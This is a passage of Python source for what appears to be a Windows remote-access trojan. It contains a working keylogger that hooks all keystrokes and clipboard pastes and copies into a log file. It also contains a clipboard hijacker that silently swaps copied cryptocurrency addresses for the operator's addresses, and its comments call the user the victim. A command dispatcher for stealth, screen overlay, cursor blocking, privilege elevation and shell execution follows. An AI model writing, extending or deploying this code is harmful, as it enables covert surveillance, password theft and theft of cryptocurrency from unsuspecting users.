# length, or typing gap into a bounded in-memory ring ("keylog dump") and,
# while file logging is on, to nvdesk\keys.log (rotated at 512 KB).
# Every physical key is captured as a token: Backspace is <BS> (never a
# silent pop), standalone modifier taps are <CTRL>/<ALT>/<SHIFT>/... on
# key-up, and CTRL/ALT/WIN combos become [^X] / [!X] / [W+X] tokens. The
# left/right modifier VKs (0xA0-0xA5) a low-level hook can report are
# canonicalised so combos still decode. Paste (Ctrl+V / Shift+Ins) logs a
# [PASTE] token plus the clipboard text; Copy/Cut log [COPY]/[CUT] markers
# with a clipboard snapshot on their own timestamped line. The hook runs on
# a message-pump thread exactly like the cursor-pin hook; an active hook
# dies with its process, so no atexit restore is needed.

_KL_TOKENS = {
    0x08: "<BS>", 0x09: "<TAB>", 0x0D: "<ENTER>", 0x13: "<PAUSE>",
    0x14: "<CAPS>", 0x1B: "<ESC>", 0x5F: "<SLEEP>",
    0x21: "<PGUP>", 0x22: "<PGDN>", 0x23: "<END>", 0x24: "<HOME>",
    0x25: "<LEFT>", 0x26: "<UP>", 0x27: "<RIGHT>", 0x28: "<DOWN>",
    0x29: "<APPS>", 0x2C: "<PRTSC>", 0x2D: "<INS>", 0x2E: "<DEL>",
    0x5B: "<LWIN>", 0x5C: "<RWIN>", 0x5D: "<MENU>",
    0x6A: "<NP*>", 0x6B: "<NP+>", 0x6D: "<NP->", 0x6E: "<NP.>",
    0x6F: "<NP/>", 0x90: "<NUMLOCK>", 0x91: "<SCROLLOCK>",
    0xA0: "<LSHIFT>", 0xA1: "<RSHIFT>", 0xA2: "<LCTRL>", 0xA3: "<RCTRL>",
    0xA4: "<LALT>", 0xA5: "<RALT>",
    0xA6: "<BACK>", 0xA7: "<FWD>", 0xA8: "<REFRESH>", 0xA9: "<STOP>",
    0xAA: "<SEARCH>", 0xAB: "<FAVORITES>", 0xAC: "<BROWSERHOME>",
    0xAD: "<MUTE>", 0xAE: "<VOLDOWN>", 0xAF: "<VOLUP>",
    0xB0: "<NEXT>", 0xB1: "<PLAYPAUSE>", 0xB2: "<PREV>", 0xB3: "<MEDIASTOP>",
    0xB4: "<LAUNCHMAIL>", 0xB5: "<LAUNCHMEDIA>",
}
_KL_MOD_SET = frozenset((0x10, 0x11, 0x12, 0x5B, 0x5C))  # shift/ctrl/alt/win
# Low-level hooks can report the left/right split VKs; map them onto the
# generic modifier so combo/shift decode logic stays single-path.
_KL_MOD_CANON = {0xA0: 0x10, 0xA1: 0x10, 0xA2: 0x11, 0xA3: 0x11,
                 0xA4: 0x12, 0xA5: 0x12}
_KL_MOD_NAMES = {0x10: "<SHIFT>", 0x11: "<CTRL>", 0x12: "<ALT>",
                 0x5B: "<LWIN>", 0x5C: "<RWIN>",
                 0xA0: "<LSHIFT>", 0xA1: "<RSHIFT>",
                 0xA2: "<LCTRL>", 0xA3: "<RCTRL>",
                 0xA4: "<LALT>", 0xA5: "<RALT>"}
_KL_LINE_MAX = 512
_KL_GAP = 1.5
_KL_RING_MAX = 400
_KL_FILE_MAX = 512 * 1024
_KL_CLIP_MAX = 400          # clipboard payload cap per paste/copy/cut entry

_klog_state = {
    "on": False, "thread": None, "hook": 0, "cbs": [],
    "units": [], "held": set(), "caps": False,
    # per-held-modifier: True once any other key went down during the hold
    "combo": {}, "mod_name": {},
    "line_start": 0.0, "ring": deque(maxlen=_KL_RING_MAX),
    "lock": threading.Lock(), "file_on": True,
    "count": 0, "start_ts": 0.0,
}


def _klog_path() -> str:
    return os.path.join(_stream_state_path(), "nvdesk", "keys.log")


def _klog_us_fallback(vk):
    """US-layout char for vk when ToUnicodeEx had nothing to say (shift and
    caps are applied from the tracked state)."""
    s = _klog_state
    shift = 0x10 in s["held"]
    if 0x41 <= vk <= 0x5A:
        up, low = chr(vk), chr(vk + 32)
        return up if (shift ^ s["caps"]) else low
    if 0x30 <= vk <= 0x39:
        return ")!@#$%^&*("[vk - 0x30] if shift else chr(vk)
    if vk == 0x20:
        return " "
    oem = {0xBA: (";", ":"), 0xBB: ("=", "+"), 0xBC: (",", "<"),
           0xBD: ("-", "_"), 0xBE: (".", ">"), 0xBF: ("/", "?"),
           0xC0: ("`", "~"), 0xDB: ("[", "{"), 0xDC: ("\\", "|"),
           0xDD: ("]", "}"), 0xDE: ("'", '"')}.get(vk)
    if oem:
        return oem[1] if shift else oem[0]
    return None


def _klog_to_unicode(vk, scan) -> str:
    """Decode one virtual key through the active layout. The keyboard-state
    array is synthesised from hook-tracked modifiers (reliable from an LL
    hook thread where GetKeyboardState is not)."""
    try:
        import ctypes
        u32 = ctypes.windll.user32
        u32.ToUnicodeEx.restype = ctypes.c_int
        u32.ToUnicodeEx.argtypes = (ctypes.c_uint, ctypes.c_uint,
                                    ctypes.POINTER(ctypes.c_ubyte),
                                    ctypes.POINTER(ctypes.c_wchar),
                                    ctypes.c_int, ctypes.c_uint,
                                    ctypes.c_void_p)
        u32.MapVirtualKeyW.restype = ctypes.c_uint
        u32.MapVirtualKeyW.argtypes = (ctypes.c_uint, ctypes.c_uint)
        u32.GetKeyboardLayout.restype = ctypes.c_void_p
        s = _klog_state
        if 0x5B in s["held"] or 0x5C in s["held"]:
            return ""                 # WIN combos tokenized instead
        st = (ctypes.c_ubyte * 256)()
        if 0x10 in s["held"]:
            st[0x10] = 0x80
        if 0x11 in s["held"]:
            st[0x11] = 0x80
        if 0x12 in s["held"]:
            st[0x12] = 0x80
        if s["caps"]:
            st[0x14] = 0x01
        buf = (ctypes.c_wchar * 8)()
        sc = u32.MapVirtualKeyW(vk, 0) or scan
        n = u32.ToUnicodeEx(vk, sc, st, buf, 8, 0,
                            u32.GetKeyboardLayout(0))
        if n > 0:
            return "".join(buf[:n])
        return ""
    except Exception:
        return ""


def _klog_combo_token(vk):
    s = _klog_state
    if 0x41 <= vk <= 0x5A:
        base = chr(vk)
    elif 0x30 <= vk <= 0x39:
        base = chr(vk)
    else:
        return None
    pre = ""
    if 0x11 in s["held"]:
        pre += "^"
    if 0x12 in s["held"]:
        pre += "!"
    if 0x5B in s["held"] or 0x5C in s["held"]:
        pre += "W+"
    return "[%s%s]" % (pre, base) if pre else None


def _klog_translate_units(vk, scan):
    """Map one key-down to its log units (pure: reads _klog_state only)."""
    s = _klog_state
    if vk in _KL_TOKENS:
        return [_KL_TOKENS[vk]]
    if 0x70 <= vk <= 0x87:
        return ["<F%d>" % (vk - 0x6F)]
    if 0x60 <= vk <= 0x69:
        return [chr(vk - 0x30)]       # numpad digits (numlock on)
    mods = s["held"] & _KL_MOD_SET
    txt = _klog_to_unicode(vk, scan)
    if txt:
        out = [c for c in txt if c not in ("\r", "\x00")]
        if out:
            # shift is never tokenized; only ctrl/alt/win combos that
            # decode to a control char become [^X]-style tokens
            if (mods - {0x10}) and len(out) == 1 and ord(out[0]) < 0x20:
                tok = _klog_combo_token(vk)
                return [tok] if tok else []
            return out
    if mods - {0x10}:
        # ctrl/alt/win held and nothing printable: tokenize letters/digits
        tok = _klog_combo_token(vk)
        return [tok] if tok else []
    ch = _klog_us_fallback(vk)   # plain or shift-only key (shift XOR caps)
    return [ch] if ch else []


def _klog_file_append(line: str) -> None:
    s = _klog_state
    if not s["file_on"] or os.name != "nt":
        return
    try:
        p = _klog_path()
        os.makedirs(os.path.dirname(p), exist_ok=True)
        try:
            if os.path.getsize(p) > _KL_FILE_MAX:
                os.replace(p, p + ".1")      # stale backup is overwritten
        except OSError:
            pass
        with open(p, "a", encoding="utf-8", errors="replace") as f:
            f.write(line + "\r\n")
    except Exception:
        pass


def _klog_flush_locked(now=None) -> None:
    """Push the current line into the ring + keys.log. Caller holds the
    state lock (or is the hook thread before it dies)."""
    s = _klog_state
    if not s["units"]:
        return
    text = "".join(s["units"])
    s["units"] = []
    line = time.strftime("%Y-%m-%d %H:%M:%S") + " " + text
    s["ring"].append(line)
    s["line_start"] = now if now else time.time()
    _klog_file_append(line)


def _klog_flush_now() -> None:
    s = _klog_state
    with s["lock"]:
        _klog_flush_locked()


def _klog_commit_locked(units, now=None) -> None:
    """Append log units to the current line; caller holds the state lock.
    Flushes on Enter, line length, or the typing gap exactly like the old
    tail of _klog_handle did."""
    s = _klog_state
    if now is None:
        now = time.time()
    if not s["units"]:
        s["line_start"] = now        # new line starts now (no stale gap)
    s["units"].extend(units)
    if not s["units"]:
        s["line_start"] = now
        return
    joined = "".join(s["units"])
    if ("<ENTER>" in units or len(joined) >= _KL_LINE_MAX
            or now - s["line_start"] >= _KL_GAP):
        _klog_flush_locked(now)


def _klog_clip_line(text) -> str:
    """Collapse a clipboard payload onto one line and cap its size so ring
    entries and keys.log lines keep their single-line format."""
    try:
        clean = re.sub(r"\s+", " ", text or "").strip()
    except Exception:
        return ""
    if len(clean) > _KL_CLIP_MAX:
        clean = clean[:_KL_CLIP_MAX] + "..."
    return clean


def _klog_clip_snapshot(kind: str, delay: float) -> None:
    """Delayed clipboard read fired by an edit key. PASTE appends the
    payload to the current line (the focused app really did paste it there);
    COPY/CUT land on their own timestamped line so the payload is never
    mistaken for typed input."""
    try:
        time.sleep(delay)
    except Exception:
        return
    if not _klog_state["on"]:
        return
    text = None
    for _ in range(4):          # OpenClipboard can race the source app
        text = _clip_read()
        if text is not None:
            break
        time.sleep(0.1)
    clean = _klog_clip_line(text)
    if not clean:
        return
    s = _klog_state
    with s["lock"]:
        if not s["on"]:
            return
        if kind == "paste":
            _klog_commit_locked([" " + clean], time.time())
        else:
            _klog_flush_locked(time.time())    # keep typed text order
            line = ("%s [%s] %s"
                    % (time.strftime("%Y-%m-%d %H:%M:%S"), kind, clean))
            s["ring"].append(line)
            _klog_file_append(line)


def _klog_schedule_clip(kind: str) -> None:
    kind = kind.upper()
    # paste delay is short so the payload lands right after [PASTE]; copy/cut
    # wait longer for the source app to finish owning the clipboard
    delay = 0.22 if kind == "PASTE" else 0.35
    try:
        threading.Thread(target=_klog_clip_snapshot, args=(kind, delay),
                         daemon=True, name="klclip").start()
    except Exception:
        pass


def _klog_edit_intent(vk, held):
    """Return (kind, inline token) when vk+held modifiers form a clipboard
    edit, else None. Runs before plain translation so Ctrl+V becomes
    [PASTE] (not [^V]), Ctrl+C / Ctrl+Ins become [COPY], Ctrl+X /
    Shift+Del become [CUT], and Shift+Ins is a paste, not an <INS>."""
    ctrl = 0x11 in held
    alt = 0x12 in held
    win = 0x5B in held or 0x5C in held
    if vk == 0x56 and ctrl and not alt:
        return ("paste", "[PASTE]")
    if vk == 0x2D and 0x10 in held and not (ctrl or alt or win):
        return ("paste", "[PASTE]")
    if vk == 0x2D and ctrl and 0x10 not in held:
        return ("copy", "[COPY]")
    if vk == 0x43 and ctrl and not alt:
        return ("copy", "[COPY]")
    if vk == 0x58 and ctrl and not alt:
        return ("cut", "[CUT]")
    if vk == 0x2E and 0x10 in held and not (ctrl or alt or win):
        return ("cut", "[CUT]")
    return None


def _klog_handle(vk, scan, flags) -> None:
    """Hook callback body. Runs on the pump thread (LL hook thread)."""
    s = _klog_state
    try:
        repeat = bool(flags & 0x40000000)     # typematic repeat (prev down)
        canon = _KL_MOD_CANON.get(vk, vk)
        if flags & 0x80:                      # key up
            if canon in _KL_MOD_SET:
                s["held"].discard(canon)
                # name only matters for a standalone tap; drop it either way
                name = (s["mod_name"].pop(canon, None)
                        or _KL_MOD_NAMES.get(vk)
                        or _KL_MOD_NAMES[canon])
                # standalone tap: nothing else went down during the hold
                if not s["combo"].pop(canon, True):
                    with s["lock"]:
                        s["count"] += 1
                        _klog_commit_locked([name], time.time())
            return
        if canon in _KL_MOD_SET:              # modifier down
            if repeat and canon in s["held"]:
                return                        # auto-repeat: state already set
            s["held"].add(canon)
            s["combo"][canon] = False        # standalone until proven used
            s["mod_name"][canon] = (_KL_MOD_NAMES.get(vk)
                                     or _KL_MOD_NAMES[canon])
            for m in list(s["held"]):
                if m != canon:
                    s["combo"][m] = True     # this press uses the others
            return
        if vk == 0x14:                        # caps lock toggles letter case
            if repeat:
                return
            s["caps"] = not s["caps"]
        for m in list(s["held"]):
            s["combo"][m] = True             # any key down uses held mods
        if repeat and (s["held"] & (_KL_MOD_SET - {0x10})):
            return                # combo auto-repeat: no re-log spam
        units = None
        if not repeat:
            edit = _klog_edit_intent(vk, s["held"])
            if edit:
                _klog_schedule_clip(edit[0])
                units = [edit[1]]
        if units is None:
            units = _klog_translate_units(vk, scan)
        if not units:
            return
        with s["lock"]:
            s["count"] += 1
            _klog_commit_locked(units, time.time())
    except Exception:
        pass                    # never raise inside a hook callback


def _klog_proc(nCode, wParam, lParam):
    import ctypes
    if nCode == 0 and lParam:
        try:
            vk = ctypes.cast(lParam,
                             ctypes.POINTER(ctypes.c_ulong)).contents.value
            scan = ctypes.cast(lParam + 4,
                               ctypes.POINTER(ctypes.c_ulong)).contents.value
            fl = ctypes.cast(lParam + 8,
                             ctypes.POINTER(ctypes.c_ulong)).contents.value
            _klog_handle(vk, scan, fl)
        except Exception:
            pass
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)


def _klog_run(ready) -> None:
    import ctypes
    import ctypes.wintypes as wt
    u32 = ctypes.windll.user32
    proc = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int,
                              ctypes.c_size_t, ctypes.c_ssize_t)(_klog_proc)
    _klog_state["cbs"].append(proc)            # keep the trampoline alive
    hook = u32.SetWindowsHookExW(13, proc, None, 0)   # WH_KEYBOARD_LL
    _klog_state["hook"] = hook
    ready.set()
    if not hook:
        return
    msg = wt.MSG()
    try:
        while u32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
            u32.TranslateMessage(ctypes.byref(msg))
            u32.DispatchMessageW(ctypes.byref(msg))
    finally:
        _klog_flush_now()          # WM_QUIT path: keep the last line


def _klog_start() -> bool:
    import ctypes
    u32 = ctypes.windll.user32
    u32.SetWindowsHookExW.restype = ctypes.c_void_p
    u32.CallNextHookEx.restype = ctypes.c_ssize_t
    u32.CallNextHookEx.argtypes = (ctypes.c_void_p, ctypes.c_int,
                                   ctypes.c_size_t, ctypes.c_ssize_t)
    s = _klog_state
    if s["hook"]:
        return True
    ready = threading.Event()
    t = threading.Thread(target=_klog_run, args=(ready,), daemon=True,
                         name="klog")
    t.start()
    ready.wait(timeout=5)
    if not s["hook"]:
        return False
    s["thread"] = t
    s["on"] = True
    s["start_ts"] = time.time()
    return True


def _klog_stop() -> None:
    import ctypes
    u32 = ctypes.windll.user32
    s = _klog_state
    t = s["thread"]
    if t is not None and t.is_alive():
        u32.PostThreadMessageW(t.native_id, 0x0012, 0, 0)   # WM_QUIT
        t.join(timeout=5)
    if s["hook"]:
        u32.UnhookWindowsHookEx(s["hook"])
        s["hook"] = 0
    _klog_flush_now()
    s["on"] = False
    s["thread"] = None
    s["held"].clear()
    s["combo"].clear()
    s["mod_name"].clear()
    s["caps"] = False


def _keylog_status() -> str:
    s = _klog_state
    live = s["hook"] and s["thread"] and s["thread"].is_alive()
    size = 0
    try:
        size = os.path.getsize(_klog_path())
    except OSError:
        pass
    with s["lock"]:
        partial = "".join(s["units"])
        ring = len(s["ring"])
    return "\n".join([
        "keylogger: %s" % ("RUNNING" if live else "stopped"),
        "started: %s" % (time.strftime("%Y-%m-%d %H:%M:%S",
                                       time.localtime(s["start_ts"]))
                         if s["start_ts"] else "-"),
        "keys captured: %d" % s["count"],
        "ring runs: %d" % ring,
        "current line: %d chars" % len(partial),
        "file logging: %s" % ("ON" if s["file_on"] else "OFF"),
        "keys.log: %d bytes (%s)" % (size, _klog_path()),
    ])


def _keylog_cmd(rest: str) -> str:
    s = _klog_state
    parts = rest.split(None, 1)
    sub = parts[0].lower() if parts else "status"
    arg = parts[1].strip() if len(parts) > 1 else ""
    if sub == "on":
        if s["hook"] and s["thread"] and s["thread"].is_alive():
            return "[i] keylogger already running"
        if _klog_start():
            return ("[+] keylogger on (keys -> %s, ring %d runs)"
                    % (_klog_path(), _KL_RING_MAX))
        return "[!] keylogger start failed"
    if sub == "off":
        if not (s["hook"] and s["thread"] and s["thread"].is_alive()):
            return "[i] keylogger not running"
        _klog_stop()
        return "[+] keylogger off"
    if sub == "status":
        return _keylog_status()
    if sub == "dump":
        _klog_flush_now()
        with s["lock"]:
            lines = list(s["ring"])
        body = "\n".join(lines) if lines else "(empty)"
        return ("[+] keylog buffer: %d runs, %d keys captured\n%s"
                % (len(lines), s["count"], body))
    if sub == "clear":
        with s["lock"]:
            s["units"] = []
            s["ring"].clear()
            s["count"] = 0
            s["line_start"] = 0.0
        try:
            open(_klog_path(), "w").close()
        except Exception:
            pass
        return "[+] keylog cleared (ring + keys.log)"
    if sub == "file":
        if not arg:
            return "[i] file logging: %s" % ("ON" if s["file_on"] else "OFF")
        if arg.lower() in ("on", "1", "true"):
            s["file_on"] = True
            return "[+] file logging ON (%s)" % _klog_path()
        if arg.lower() in ("off", "0", "false"):
            s["file_on"] = False
            return "[+] file logging OFF (memory ring only)"
    return ("[!] usage: keylog on | off | status | dump | clear | "
            "file <on|off>")


# ===== CRYPTO CLIPBOARD SWITCHER =====
# Watches the clipboard and silently rewrites addresses of configured
# coins to the operator's own addresses. The watch thread only polls the
# clipboard sequence number, so it never contends on OpenClipboard unless
# the victim actually copied something new. Config is target-side JSON at
# nvdesk\clip.json so it survives beacon restarts. Only coins listed in
# 'crypto set' are watched; detection is per-coin regex with a priority
# pass so a broad pattern (sol is base58 32-44) can never steal a token
# already claimed by a more specific family.

_CRYPTO_PATTERNS = {
    "btc":  r"(?:bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{25,80}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})",
    "eth":  r"0x[a-fA-F0-9]{40}",
    "bnb":  r"0x[a-fA-F0-9]{40}",
    "ltc":  r"[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}",
    "doge": r"D[a-km-zA-HJ-NP-Z1-9]{25,33}",
    "dash": r"X[a-km-zA-HJ-NP-Z1-9]{25,33}",
    "trx":  r"T[1-9A-HJ-NP-Za-km-z]{33}",
    "bch":  r"(?:q|p)[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{41}",
    "ada":  r"addr1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{58,90}",
    "zec":  r"(?:t1[a-km-zA-HJ-NP-Z1-9]{25,34}|zs1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{74})",
    "xmr":  r"[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}",
    "sol":  r"[1-9A-HJ-NP-Za-km-z]{32,44}",
}
# Most specific first; 'sol' is deliberately last (broad base58).
_CRYPTO_PRIORITY = ["zec", "ada", "xmr", "bch", "btc", "eth", "bnb", "trx",
                    "ltc", "doge", "dash", "sol"]

_CRYPTO_COMPILED = {}
for _coin, _core in _CRYPTO_PATTERNS.items():
    try:
        _CRYPTO_COMPILED[_coin] = re.compile(
            r"(?<![A-Za-z0-9])(?:%s)(?![A-Za-z0-9])" % _core)
    except Exception:
        pass

_crypto_cfg = {}
_crypto_lock = threading.Lock()
_crypto_state = {"thread": None, "stop": threading.Event(), "on": False,
                 "loaded": False, "seq": 0, "swaps": 0, "stats": {},
                 "last": 0.0, "start_ts": 0.0}


def _crypto_cfg_path() -> str:
    return os.path.join(_stream_state_path(), "nvdesk", "clip.json")


def _crypto_ensure_cfg() -> None:
    with _crypto_lock:
        if _crypto_state["loaded"]:
            return
        _crypto_state["loaded"] = True
        try:
            with open(_crypto_cfg_path(), "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                for k, v in data.items():
                    if k in _CRYPTO_PATTERNS and isinstance(v, str):
                        _crypto_cfg[k] = v
        except Exception:
            pass


def _crypto_save_cfg() -> None:
    try:
        p = _crypto_cfg_path()
        os.makedirs(os.path.dirname(p), exist_ok=True)
        tmp = p + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(_crypto_cfg, f, indent=1)
        os.replace(tmp, p)
    except Exception:
        pass


def _clip_seq() -> int:
    import ctypes
    try:
        u32 = ctypes.windll.user32
        u32.GetClipboardSequenceNumber.restype = ctypes.c_uint
        return int(u32.GetClipboardSequenceNumber())
    except Exception:
        return 0


def _clip_read():
    import ctypes
    import ctypes.wintypes as wt
    try:
        u32 = ctypes.windll.user32
        k32 = ctypes.windll.kernel32
        if not u32.IsClipboardFormatAvailable(13):     # CF_UNICODETEXT
            return None
        if not u32.OpenClipboard(None):
            return None
        try:
            u32.GetClipboardData.restype = ctypes.c_void_p
            h = u32.GetClipboardData(13)
            if not h:
                return None
            k32.GlobalLock.restype = ctypes.c_void_p
            p = k32.GlobalLock(h)
            if not p:
                return None
            try:
                return ctypes.cast(p, ctypes.c_wchar_p).value or None
            finally:
                k32.GlobalUnlock(h)
        finally:
            u32.CloseClipboard()
    except Exception:
        return None


def _clip_write(text: str) -> bool:
    import ctypes
    try:
        u32 = ctypes.windll.user32
        k32 = ctypes.windll.kernel32
        u32.OpenClipboard.restype = ctypes.c_int
        u32.EmptyClipboard.restype = ctypes.c_int
        u32.SetClipboardData.restype = ctypes.c_void_p
        k32.GlobalAlloc.restype = ctypes.c_void_p
        k32.GlobalAlloc.argtypes = (ctypes.c_uint, ctypes.c_size_t)
        k32.GlobalLock.restype = ctypes.c_void_p
        k32.GlobalLock.argtypes = (ctypes.c_void_p,)
        if not u32.OpenClipboard(None):
            return False
        try:
            u32.EmptyClipboard()
            raw = text.encode("utf-16-le") + b"\x00\x00"
            h = k32.GlobalAlloc(0x0042, len(raw))       # GMEM_MOVEABLE|ZEROINIT
            if not h:
                return False
            p = k32.GlobalLock(h)
            if not p:
                return False
            try:
                ctypes.memmove(p, raw, len(raw))
            finally:
                k32.GlobalUnlock(h)
            if not u32.SetClipboardData(13, h):         # system owns h now
                return False
            return True
        finally:
            u32.CloseClipboard()
    except Exception:
        return False


def _crypto_plan(text, cfg):
    """Return (new_text, {coin: count}) replacing every configured-coin
    address token in text. Higher-priority coin wins on overlap, so sol
    can only claim tokens no specific family matched."""
    if not text or not cfg:
        return text, {}
    chosen = []
    for coin in _CRYPTO_PRIORITY:
        if coin not in cfg:
            continue
        pat = _CRYPTO_COMPILED.get(coin)
        if pat is None:
            continue
        for m in pat.finditer(text):
            a, b = m.span()
            if any(not (b <= ca or a >= cb) for (ca, cb, _) in chosen):
                continue
            chosen.append((a, b, coin))
    if not chosen:
        return text, {}
    out = text
    for a, b, coin in sorted(chosen, reverse=True):
        out = out[:a] + cfg[coin] + out[b:]
    rep = {}
    for _, _, coin in chosen:
        rep[coin] = rep.get(coin, 0) + 1
    return out, rep


def _crypto_live() -> bool:
    st = _crypto_state
    return st["on"] and st["thread"] is not None and st["thread"].is_alive()


def _crypto_start() -> None:
    st = _crypto_state
    st["stop"].clear()
    st["on"] = True
    st["start_ts"] = time.time()
    t = threading.Thread(target=_crypto_watch, daemon=True, name="clipw")
    st["thread"] = t
    t.start()


def _crypto_stop() -> None:
    st = _crypto_state
    st["stop"].set()
    if st["thread"] is not None:
        st["thread"].join(timeout=5)
    st["on"] = False
    st["thread"] = None


def _crypto_watch() -> None:
    st = _crypto_state
    while not st["stop"].wait(0.7):
        try:
            seq = _clip_seq()
            if seq == 0 or seq == st["seq"]:
                continue
            text = _clip_read()
            st["seq"] = seq
            if not text:
                continue
            with _crypto_lock:
                cfg = dict(_crypto_cfg)
            new, rep = _crypto_plan(text, cfg)
            if not rep or new == text:
                continue
            if not _clip_write(new):
                continue
            with _crypto_lock:
                st["swaps"] += 1
                st["last"] = time.time()
                for c, n in rep.items():
                    st["stats"][c] = st["stats"].get(c, 0) + n
            _beacon_log("[clip] crypto-swap: %s"
                        % ", ".join("%s x%d" % (k, v)
                                    for k, v in rep.items()))
        except Exception:
            pass


def _crypto_status() -> str:
    _crypto_ensure_cfg()
    st = _crypto_state
    with _crypto_lock:
        coins = sorted(_crypto_cfg)
        stats = dict(st["stats"])
    live = _crypto_live()
    lines = [
        "crypto switcher: %s" % ("RUNNING" if live else "stopped"),
        "configured: %s" % (", ".join(coins) if coins else "(none)"),
        "swaps: %d" % st["swaps"],
    ]
    if stats:
        lines.append("by coin: %s" % ", ".join(
            "%s x%d" % (k, v) for k, v in sorted(stats.items())))
    lines.append("last swap: %s" % (time.strftime(
        "%Y-%m-%d %H:%M:%S", time.localtime(st["last"]))
        if st["last"] else "never"))
    try:
        size = os.path.getsize(_crypto_cfg_path())
        lines.append("cfg: %d bytes (%s)" % (size, _crypto_cfg_path()))
    except OSError:
        lines.append("cfg: %s (not written yet)" % _crypto_cfg_path())
    return "\n".join(lines)


def _crypto_list() -> str:
    _crypto_ensure_cfg()
    with _crypto_lock:
        cfg = dict(_crypto_cfg)
    lines = ["configured targets:"]
    if not cfg:
        lines.append("  (none - use: crypto set <coin> <address>)")
    for coin in _CRYPTO_PRIORITY:
        if coin in cfg:
            lines.append("  %-5s %s" % (coin, cfg[coin]))
    lines.append("supported coins: %s" % ", ".join(_CRYPTO_PRIORITY))
    if "sol" in cfg:
        lines.append("[i] note: sol is a broad base58 pattern; other "
                     "base58 families may match it too")
    lines.append(_crypto_status())
    return "\n".join(lines)


def _crypto_cmd(rest: str) -> str:
    _crypto_ensure_cfg()
    parts = rest.split(None, 1)
    sub = parts[0].lower() if parts else "status"
    arg = parts[1].strip() if len(parts) > 1 else ""
    if sub == "set":
        ap = arg.split(None, 1)
        if len(ap) < 2 or not ap[0].lower() in _CRYPTO_PATTERNS:
            return ("[!] usage: crypto set <coin> <address> | coins: %s"
                    % ", ".join(_CRYPTO_PRIORITY))
        coin = ap[0].lower()
        addr = ap[1].strip()
        if not re.fullmatch("(?:%s)" % _CRYPTO_PATTERNS[coin], addr):
            return "[!] '%s' does not look like a valid %s address" % (addr,
                                                                       coin)
        with _crypto_lock:
            _crypto_cfg[coin] = addr
        _crypto_save_cfg()
        return "[+] %s -> %s" % (coin, addr)
    if sub == "del":
        if not arg:
            return "[!] usage: crypto del <coin>"
        coin = arg.lower()
        with _crypto_lock:
            if coin not in _crypto_cfg:
                return "[!] %s is not configured" % coin
            del _crypto_cfg[coin]
        _crypto_save_cfg()
        return "[+] %s removed" % coin
    if sub == "list":
        return _crypto_list()
    if sub == "on":
        if _crypto_live():
            return "[i] crypto switcher already running"
        with _crypto_lock:
            cfg = dict(_crypto_cfg)
        if not cfg:
            return ("[!] no target addresses configured - start with "
                    "crypto set btc <address>")
        _crypto_start()
        return ("[+] crypto switcher on (watching clipboard, %d coin%s "
                "configured)" % (len(cfg), "s" if len(cfg) != 1 else ""))
    if sub == "off":
        if not _crypto_live():
            return "[i] crypto switcher not running"
        _crypto_stop()
        return "[+] crypto switcher off"
    if sub == "status":
        return _crypto_status()
    if sub == "clip":
        if not arg:
            return "[!] usage: crypto clip <address-or-text>"
        if _clip_write(arg):
            return "[+] clipboard set to %r" % arg[:60]
        return "[!] clipboard write failed (held by another app?)"
    if sub == "test":
        if not arg:
            return "[!] usage: crypto test <text>"
        with _crypto_lock:
            cfg = dict(_crypto_cfg)
        new, rep = _crypto_plan(arg, cfg)
        out = ["[+] input : %s" % arg, "[+] output: %s" % new]
        if rep:
            out.append("[+] swapped: %s" % ", ".join(
                "%s x%d" % (k, v) for k, v in sorted(rep.items())))
        else:
            out.append("[-] no configured coin address found")
        return "\n".join(out)
    return _crypto_status()

def execute_command(cmd: str) -> bytes:
    """Dispatch a command and always come back alive. A handler exception
    (overlay / cursor ghost paths historically raised and escaped the
    socket loop's OSError-only guard, silently killing the beacon process)
    is now converted into an in-band error reply, logged target-side, and
    the session keeps running."""
    try:
        return _execute_command(cmd)
    except Exception:
        tb = traceback.format_exc()
        try:
            _beacon_log("[crash] command handler crashed:\n" + tb)
        except Exception:
            pass
        return ("[!] command crashed (session kept alive):\n%s\n" % tb
                ).encode("utf-8", errors="replace") + MARKER


def _execute_command(cmd: str) -> bytes:
    """Run a shell command and return its output. Handles cd persistently."""
    low = cmd.strip().lower()

    # netvnc stream dispatch (before generic shell)
    if low == "stream" or low.startswith("stream "):
        parts = cmd.split()
        if len(parts) >= 2 and parts[1].lower() == "status":
            return (stream_status() + "\n").encode() + MARKER
        if len(parts) >= 2 and parts[1].lower() == "stop":
            return (stop_stream() + "\n").encode() + MARKER
        if len(parts) >= 2 and parts[1].lower() == "log":
            n = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 100
            return (stream_log(n) + "\n").encode() + MARKER
        room = parts[1] if len(parts) >= 2 and not parts[1].lower().startswith("-") else "default"
        return (deploy_stream(room) + "\n").encode() + MARKER
    if low in ("stream stop", "stop stream", "stopstream"):
        return (stop_stream() + "\n").encode() + MARKER

    # overlay / cursor / elevation / power dispatch (before generic shell)
    if low == "overlay on" or low.startswith("overlay on "):
        return (_overlay_on("black" in low) + "\n").encode() + MARKER
    if low == "overlay off":
        return (_overlay_off() + "\n").encode() + MARKER
    if low == "cursor block" or low == "cursor block hard":
        return (_cursor_block("hard" in low) + "\n").encode() + MARKER
    if low == "cursor unblock":
        return (_cursor_unblock() + "\n").encode() + MARKER
    if low in ("cursor ghost on", "ghost cursor on"):
        return (_ghost_on_cmd() + "\n").encode() + MARKER
    if low in ("cursor ghost off", "ghost cursor off"):
        return (_ghost_off_cmd() + "\n").encode() + MARKER
    if low == "stealth on":
        return (_stealth_on("manual") + "\n").encode() + MARKER
    if low == "stealth off":
        return (_stealth_off_cmd() + "\n").encode() + MARKER
    if low == "stealth status":
        return (_stealth_status() + "\n").encode() + MARKER
    if low == "under on":
        return (_under_start() + "\n").encode() + MARKER
    if low == "under off":
        return (_under_stop() + "\n").encode() + MARKER
    if low == "under status":
        return (_under_status() + "\n").encode() + MARKER
    if low == "admin":
        return (request_admin() + "\n").encode() + MARKER
    if low == "wake arm":
        return (_wake_arm() + "\n").encode() + MARKER
    if low == "wake disarm":
